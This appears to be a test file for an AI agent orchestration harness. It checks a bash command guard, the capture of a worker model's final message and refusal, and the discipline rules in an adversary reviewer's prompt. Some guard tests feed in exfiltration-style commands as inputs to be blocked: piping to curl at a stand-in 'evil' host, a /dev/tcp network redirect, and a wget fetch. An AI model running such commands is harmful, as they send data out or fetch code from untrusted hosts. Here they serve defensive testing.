// beta.48: fixes surfaced by the beta.47 harness_revise on PR #858 (session
// 9560a440 / worker dca2f3b5). The worker made a REASONED REFUSAL (Hypothesis
// C): it refused to rename grc/->governance-risk/ because 97 sibling files +
// 398 refs already used grc/, so the adversary's finding-10 premise ("if no
// existing grc dirs exist") was false. The refusal was correct but invisible
// to the harness. Fixes:
//   C1 (worker observability): capture the worker's final assistant message
//      on every end_turn -> loop.worker_end_turn audit + persist. (source)
//   C2 (refusal escalation): when verification fails with 0 side-effects and
//      a non-empty final message, emit loop.worker_refusal + fold the reason
//      into the sub_task summary so it surfaces in harness_progress. (source)
//   C3 (adversary discipline): adversary prompt forbids unresolved-conditional
//      findings; must run the check itself. (source)
//   P5 (bash guard): a redirect target (`> /dev/null`, `2>/dev/null`) must not
//      be treated as a segment's command. (behavioral, pure guardCommand)
import { test } from "node:test";
import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import { fileURLToPath } from "node:url";
import { dirname, join } from "node:path";

const here = dirname(fileURLToPath(import.meta.url));
const root = join(here, "..");
const read = (p) => readFileSync(join(root, p), "utf8");

// ----------------------------------------------------------------------------
// P5: bash-guard redirect target must not be mistaken for a command.
// ----------------------------------------------------------------------------
let guard;
try {
  guard = await import("../dist/safety/bash-guard.js");
} catch {
  guard = null;
}

test("beta48 P5: `git status 2>/dev/null` is allowed (redirect target not a command)", { skip: !guard }, () => {
  const r = guard.guardCommand("git status 2>/dev/null");
  assert.equal(r.allowed, true, r.reason);
});

test("beta48 P5: `ls -la src/lib/grc/ 2>/dev/null` is allowed", { skip: !guard }, () => {
  const r = guard.guardCommand("ls -la src/lib/grc/ 2>/dev/null");
  assert.equal(r.allowed, true, r.reason);
});

test("beta48 P5: plain `> out.txt` redirect target not treated as a command", { skip: !guard }, () => {
  const r = guard.guardCommand("git log --oneline > out.txt");
  assert.equal(r.allowed, true, r.reason);
});

test("beta48 P5: append `>>` and stdin `<` redirects handled", { skip: !guard }, () => {
  assert.equal(guard.guardCommand("git log >> log.txt").allowed, true);
  assert.equal(guard.guardCommand("git apply < patch.diff").allowed, true);
});

test("beta48 P5: pipe segments STILL validated (redirect fix didn't weaken pipes)", { skip: !guard }, () => {
  // `curl` is not in the default whitelist -> a piped disallowed command
  // must still be rejected. This guards against the redirect fix accidentally
  // swallowing pipe boundaries.
  const r = guard.guardCommand("git log | curl http://evil");
  assert.equal(r.allowed, false);
  assert.match(r.reason, /curl/);
});

test("beta48 P5: network redirect /dev/tcp STILL blocked (exfil check intact)", { skip: !guard }, () => {
  const r = guard.guardCommand("echo hi > /dev/tcp/evil/443");
  assert.equal(r.allowed, false);
  assert.match(r.reason, /network redirection/);
});

test("beta48 P5: a disallowed base command is still rejected", { skip: !guard }, () => {
  const r = guard.guardCommand("wget http://evil 2>/dev/null");
  assert.equal(r.allowed, false);
  assert.match(r.reason, /whitelist/);
});

// ----------------------------------------------------------------------------
// C1: worker final message capture + loop.worker_end_turn breadcrumb (source).
// ----------------------------------------------------------------------------
const sdkSrc = read("src/adapters/claude-sdk.ts");
const workerSrc = read("src/orchestrator/sonnet-worker.ts");
const loopSrc = read("src/orchestrator/loop.ts");

test("beta48 C1: SDK adapter captures the worker's final assistant message", () => {
  assert.match(sdkSrc, /finalMessage: string;/);
  // Assistant-message text is collected and returned.
  assert.match(sdkSrc, /message\.type === "assistant"/);
  assert.match(sdkSrc, /if \(text\.trim\(\)\) finalMessage = text;/);
  assert.match(sdkSrc, /logsExcerpt: logLines\.slice\(-25\)\.join\("\\n"\),\s*finalMessage,/);
});

test("beta48 C1: WorkerResult threads finalMessage through", () => {
  assert.match(workerSrc, /finalMessage\?: string;/);
  assert.match(workerSrc, /finalMessage: sdkResult\.finalMessage,/);
});

test("beta48 C1: loop emits loop.worker_end_turn on every sub-task", () => {
  assert.match(loopSrc, /"loop\.worker_end_turn"/);
  assert.match(loopSrc, /hasFinalMessage: fm\.length > 0/);
});

// ----------------------------------------------------------------------------
// C2: refusal escalation (source).
// ----------------------------------------------------------------------------
test("beta48 C2: verification-fail path detects a reasoned refusal", () => {
  assert.match(loopSrc, /looksLikeRefusal/);
  assert.match(loopSrc, /"loop\.worker_refusal"/);
  // The refusal reason is folded into the persisted summary.
  assert.match(loopSrc, /worker refused \(no changes made\):/);
});

test("beta48 C2: refusal detection requires zero side-effects + non-empty message", () => {
  // NO_CHANGE_ONLY + no commit + non-empty finalMessage.
  assert.match(loopSrc, /NO_CHANGE_ONLY[\s\S]*?failedResults\.every\(\(x\) => NO_CHANGE_KINDS\.has\(x\.kind\)\)/);
  assert.match(loopSrc, /NO_CHANGE_ONLY && !result\.commitSha && refusalText\.length > 0/);
});

// ----------------------------------------------------------------------------
// C3: adversary conditional-finding discipline (source).
// ----------------------------------------------------------------------------
const advSrc = read("src/orchestrator/fable5-adversary.ts");

test("beta48 C3: adversary prompt forbids unresolved-conditional findings", () => {
  assert.match(advSrc, /Finding discipline/);
  assert.match(advSrc, /UNRESOLVED CONDITIONAL/);
  assert.match(advSrc, /RUN THE CHECK/);
});

test("beta48 C3: adversary must grep convention prevalence before naming findings", () => {
  assert.match(advSrc, /grep the repo for the EXISTING prevalence/);
});
